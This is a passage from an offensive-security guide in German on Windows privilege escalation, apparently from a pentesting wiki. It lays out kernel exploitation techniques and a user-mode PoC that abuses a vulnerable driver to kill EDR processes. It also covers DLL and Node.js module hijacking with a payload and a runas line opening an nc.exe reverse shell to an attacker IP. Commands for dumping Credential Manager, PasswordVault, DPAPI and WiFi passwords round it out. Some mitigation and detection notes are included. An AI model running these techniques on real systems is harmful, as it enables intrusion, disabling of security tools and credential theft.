- **Refill-Ziele mit vielen Zeigern**: Die registrierten Buffer-Arrays des Windows-**I/O-Rings** eignen sich hervorragend als Disclosure-Ziele, weil ihre Paged-Pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Zeiger auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays und ermittle das umgebende `IORING_OBJECT`. Beschädige dann **`RegBuffers`** und **`RegBuffersCount`**, damit nachfolgende I/O-Ring-Operationen vom Angreifer gefälschte Einträge verwenden und arbitrary kernel read/write ermöglichen. Wenn der einzige verfügbare Write einen stabilen Byte-Wert liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), kannst du mit **überlappenden, nicht ausgerichteten Writes** einen User-Zeiger aus wiederholten Bytes wie `0x0101010101010101` erzeugen, ihn mit `VirtualAlloc` mappen und dort das gefälschte registrierte Buffer-Array ablegen.<sup>[[30]](#references)</sup>

Nützliche Debugging-Indikatoren:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Nachdem du über den beschädigten I/O ring beliebige Kernel-Lese-/Schreibzugriffe erlangt hast, stiehl mit dem standardmäßigen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry-Hive-Speicherbeschädigungs-Primitives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Layouts vorzubereiten, beschreibbare HKLM/HKU-Unterstrukturen auszunutzen und Metadatenkorruption ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Die gesamte Angriffskette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues`-Type Confusion im Direct-Modus über vom Angreifer kontrollierte Pfade

Manche Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen anschließend `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` und einem skalaren Stack-Ziel wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` anhand des **tatsächlichen** Registry-Typs interpretiert und nicht anhand des vom Entwickler erwarteten Typs.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer ausgewählte Schlüssel abzufragen, ihre Existenz über Rückgabecodes/Logs zu leaken und manchmal Werte zu lesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherbeschädigung**: Ein skalares Ziel wie `&readValue` wird abhängig vom Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder Puffer mit festgelegter Größe fehlinterpretiert.

Praktische Hinweise zur Ausnutzung:

- **Windows-8+-Mitigation**: Trifft die Abfrage auf eine **nicht vertrauenswürdige Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` abzulegen.
- **Staging in vertrauenswürdigen Hives**: Verwende NtObjectManager, um beschreibbare Unterstrukturen von `\Registry\Machine` aufzuzählen. Wiederhole den Scan mit einem duplizierten **Low-Integrity**-Token, um Schlüssel zu finden, auf die aus Sandbox-Kontexten zugegriffen werden kann:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibzugriff über 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im Direct-Modus wird erwartet, dass `EntryContext` auf eine `UNICODE_STRING` zeigt. Lädt der Code zunächst ein vom Angreifer kontrolliertes `REG_DWORD` in einen skalaren Wert auf dem Stack und verwendet anschließend denselben Puffer erneut für einen String-Lesezugriff, kontrolliert der Angreifer `Length`/`MaximumLength` und kann den `Buffer`-Zeiger teilweise beeinflussen. Dadurch entsteht ein teilweise kontrollierter Kernel-Schreibzugriff.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der Direct-Modus das erste `LONG` an `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesezugriff einen **negativen**, vom Angreifer kontrollierten Wert in der wiederverwendeten skalaren Variable, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Dies ist oft der einfachste Weg, einen Callback-Zeiger vollständig zu überschreiben.

Starkes Hunting-Muster: **unterschiedliche Registry-Lesezugriffe in dieselbe Stack-Variable, ohne sie erneut zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, in denen der erste Registry-Lesezugriff darüber entscheidet, ob ein zweiter erfolgt.

#### Fehlendes FILE_DEVICE_SECURE_OPEN bei Geräteobjekten ausnutzen (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Geräteobjekt mit einem starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Gerät über einen Pfad mit einer zusätzlichen Komponente geöffnet wird. Dadurch kann jeder nicht privilegierte Benutzer über einen Namespace-Pfad wie diesen ein Handle erhalten:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulationen ausnutzen. In freier Wildbahn beobachtete Fähigkeiten:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter Raw-Disk-Lese-/Schreibzugriff (Offline-Manipulationen, Persistenztricks beim Booten).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch sich AV/EDR aus dem Userland über den Kernel beenden lässt.

Minimales PoC-Muster (User-Modus):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Überprüfe bei privilegierten Vorgängen den Kontext des Aufrufers. Führe PP/PPL-Prüfungen durch, bevor du das Beenden eines Prozesses oder die Rückgabe eines Handles erlaubst.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe Broker-Modelle anstelle direkter Kernel-Berechtigungen in Betracht.

Erkennungsideen für Verteidiger
- Überwache Öffnungsversuche verdächtiger Gerätenamen im User Mode (z. B. \\ .\\amsdk*) sowie bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setze Microsofts Sperrliste für anfällige Treiber durch (HVCI/WDAC/Smart App Control) und pflege eigene Zulassungs- und Sperrlisten.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL hijacken und **deine Berechtigungen erweitern**.<sup>[[2]](#references)</sup>

Überprüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie diese Prüfung missbraucht werden kann:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron-Modulauflösungs-Hijacking über `C:\node_modules`

Dies ist eine Variante des **Windows-Uncontrolled-Search-Path**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node löst Pakete auf, indem es den Verzeichnisbaum nach oben durchläuft und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann dieser Suchlauf bis zum Laufwerksstamm reichen. Daher kann eine Anwendung, die aus `C:\Users\Administrator\project\app.js` gestartet wird, Folgendes prüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit niedrigen Berechtigungen** `C:\node_modules` erstellen kann, kann er eine bösartige `foo.js` (oder einen Paketordner) dort platzieren und warten, bis ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Damit wird daraus **LPE**, sobald das Ziel als Administrator, über eine erhöhte geplante Aufgabe/einen Dienst-Wrapper oder als automatisch gestartete privilegierte Desktop-App ausgeführt wird.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- sich das anfällige `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode befindet

### Anfällige Ziele aufspüren

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = Zieldatei (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Konzentriere dich auf `NAME NOT FOUND` und den abschließenden erfolgreichen Zugriff unter `C:\node_modules`

Nützliche Muster für Code-Reviews in entpackten `.asar`-Dateien oder Anwendungsquellen:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder durch Prüfung des Quellcodes.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Lege ein Modul mit dem exakt erwarteten Namen ab:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Lösen Sie die Zielanwendung aus. Wenn die Anwendung `require("foo")` versucht und das legitime Modul fehlt, lädt Node möglicherweise `C:\node_modules\foo.js`.

Reale Beispiele für fehlende optionale Module, auf die dieses Muster zutrifft, sind `bluebird` und `utf-8-validate`. Die **Technik** ist jedoch der wiederverwendbare Teil: Finden Sie einen beliebigen **fehlenden Bare Import**, den ein privilegierter Windows-Node-/Electron-Prozess auflöst.

### Erkennungs- und Härtungsmaßnahmen

- Richten Sie eine Warnung ein, wenn ein Benutzer `C:\node_modules` erstellt oder neue `.js`-Dateien bzw. Pakete dort ablegt.
- Suchen Sie nach Prozessen mit hoher Integrität, die aus `C:\node_modules\*` lesen.
- Bündeln Sie alle Laufzeitabhängigkeiten in der Produktion und prüfen Sie die Verwendung von `optionalDependencies`.
- Prüfen Sie Code von Drittanbietern auf stille Muster wie `try { require("...") } catch {}`.
- Deaktivieren Sie optionale Prüfungen, sofern die Bibliothek dies unterstützt (beispielsweise können einige `ws`-Deployments die Legacy-Prüfung auf `utf-8-validate` mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfe, ob weitere bekannte Computer fest in der hosts-Datei eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**

```bash
netstat -ano #Opened ports?
```

Bei einem lokalen Listener solltest du seine PID dem Prozessbesitzer, dem Pfad zur ausführbaren Datei und dem Dienst oder geplanten Task zuordnen, der ihn startet. Ein Remote-Control-Dienst kann nur dann Zugriff als sein Desktopbenutzer ermöglichen, wenn seine Authentifizierung und Befehlssteuerung dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die unter einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Untersuchungsziel: Der Listener und der Binärdateipfad sind passive Hinweise, während ein authentifizierter Weg über eine Speicherbeschädigung die Analyse genau dieser Binärdatei und ihrer erreichbaren Eingaben erfordert. Wenn ein offener Port zu einem Systemprozess zu gehören scheint, vergleiche ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor du den Backend-Dienst zuordnest; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um die Firewall**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere [Befehle zur Netzwerkaufklärung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn du den Benutzer `root` erhältst, kannst du auf jedem Port lauschen (wenn du `nc.exe` zum ersten Mal zum Lauschen auf einem Port verwendest, wirst du über eine GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

`root` unter Linux in WSL gewährt für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, solltest du Shell-History-Dateien (einschließlich `/root/.bash_history`) auf Befehle überprüfen, in denen möglicherweise Zugangsdaten aufgezeichnet wurden. Eine Rechteausweitung erfordert weiterhin ein gültiges Konto mit höheren Berechtigungen und einen zulässigen Authentifizierungsweg. Die Struktur `LocalState\rootfs` gilt für ältere WSL-Installationen; WSL 2 speichert die Distribution häufig auf einer virtuellen Festplatte namens [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Vermeide es, bei automatisierten Aufzählungen Inhalte des Verlaufs auszugeben.

## Windows-Zugangsdaten

### Winlogon-Zugangsdaten

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Zugangsdaten. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextfund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA-Geheimnis speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Lesezugriffe belegen weder, ob dieses Geheimnis existiert, noch ob es abgerufen werden kann. Prüfe die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Zugangsdaten meldest.

### Anmeldeinformationsverwaltung / Windows Vault

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen sich **Windows** **Benutzer automatisch anmelden** kann. Zunächst könnte es so klingen, als könnten Benutzer Anmeldeinformationen für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen, aber so funktioniert es nicht.

Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen für den Zugriff auf eine Ressource benötigt** (einen Server oder eine Website), diesen Credential Manager und Windows Vault **verwenden** und die gespeicherten Anmeldeinformationen nutzen kann, anstatt dass Benutzer jedes Mal Benutzernamen und Passwort eingeben müssen.

Wenn Anwendungen nicht mit Credential Manager interagieren, können sie meiner Meinung nach die Anmeldeinformationen für eine bestimmte Ressource nicht verwenden. Wenn deine Anwendung also den Vault nutzen soll, muss sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem standardmäßigen Vault **anfordern**.

Verwende `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Rechner aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Anschließend kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire Powershells-Modul](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstokens und Passwörter im Klartext im Universal Windows Platform (UWP) `PasswordVault` (auch als `Web Credentials` in `vaultcmd` verfügbar). Dieser Speicherbereich ist sitzungsisoliert und kann nativ entschlüsselt werden, ohne Administratorrechte oder `SeDebugPrivilege` zu benötigen.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Passwörter im Klartext zu dumpen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird hauptsächlich innerhalb des Windows-Betriebssystems zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Bei dieser Verschlüsselung wird ein Benutzer- oder Systemgeheimnis genutzt, um maßgeblich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Mit DPAPI verschlüsselte RSA-Schlüssel von Benutzern werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der zusammen mit dem Hauptschlüssel, der die privaten Schlüssel des Benutzers schützt, in derselben Datei gespeichert ist**, besteht normalerweise aus 64 Byte zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist und dessen Inhalt daher nicht mit dem Befehl `dir` in CMD aufgelistet werden kann, wohl aber mit PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz-Modul** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) entschlüsseln.

Die **durch das Masterpasswort geschützten Anmeldedatendateien** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele DPAPI-**masterkeys** aus dem **Speicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldedaten

**PowerShell-Anmeldedaten** werden häufig für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldedaten bequem zu speichern. Die Anmeldedaten sind durch **DPAPI** geschützt. Das bedeutet in der Regel, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Anmeldedatei kann einen beliebigen Dateinamen oder `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventur darauf verweist, ermittle das tatsächliche Profilverzeichnis des Kontos, statt `C:\Users` anzunehmen: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss unabhängig davon über gültige Berechtigungen für den vorgesehenen Dienst verfügen. Prüfe zuerst Pfade und ACLs, ohne bei routinemäßigen Aufzählungen verschlüsselte oder Klartextwerte auszugeben.

Um PS-Anmeldedaten aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes ausführen:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### WLAN

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Kürzlich ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwende das Mimikatz-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` kannst du **viele DPAPI masterkeys aus dem Speicher extrahieren**

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuche lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Dokumenten des Benutzers, einschließlich Dateien mit gewöhnlichen Namen wie `config.xml`. Ermittle das Verbindungsschema und verschlüsselte `Password`-Attribute, bevor du eine XML-Datei als möglichen Zugangsdatenfund einstufst. Der gespeicherte Wert ist kein DPAPI/RDCMan-Passwort; die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei ab und davon, ob ein benutzerdefiniertes master password verwendet wurde. Vermeide es, verschlüsselte Werte bei einer breit angelegten Suche auszugeben.

**Remote Desktop Plus-Profil-Exporte** können ebenfalls in Benutzerverzeichnissen oder einem gemeinsam genutzten Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Betrachte ein nicht leeres Passwortelement als möglichen Zugangsdatenfund, ohne es auszugeben oder davon auszugehen, dass es im Klartext vorliegt: [der Anbieter weist darauf hin](https://www.donkz.nl/), dass der Profilschutz an das erstellende Konto und den Computer gebunden oder weniger streng konfiguriert sein kann. Bestätige Herkunft und Wiederherstellungsbedingungen der Datei, bevor du dich darauf verlässt.

### Sticky Notes

Viele verwenden die StickyNotes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu **speichern**, ohne zu wissen, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und ist immer eine Suche und Untersuchung wert.

Manchmal speichern Nutzer Passwörter und andere Informationen in Haftnotiz-Apps. Die als Microsoft-Paket bereitgestellte Sticky Notes-App speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermittle die installierte App und das Speicherformat, bevor du aus einer fehlenden SQLite-Datei schließt, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, kann eine Kopie von `plum.sqlite` allein kürzlich festgeschriebene Notizen auslassen. Bewahre `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und füge, falls verfügbar, auch `plum.sqlite-shm` hinzu; der Shared-Memory-Index kann neu erstellt werden, aber das WAL gehört zum persistenten Zustand der Datenbank. Siehe [SQLite-Dokumentation zu WAL](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein möglicher Zugangsdatenfund: Überprüfe Konto, zulässigen Zugriff und die Wiederverwendung des Passworts getrennt. Für einen verschlüsselten Passwortmanager-Eintrag ist außerdem der tatsächliche Entschlüsselungsschlüssel sowie eine anwendungsspezifische Interpretation erforderlich, bevor er als Nachweis für eine Anmeldung mit höheren Berechtigungen gelten kann.

### AppCmd.exe

**Beachte, dass du Administrator sein und mit einem High Integrity Level arbeiten musst, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise **Zugangsdaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
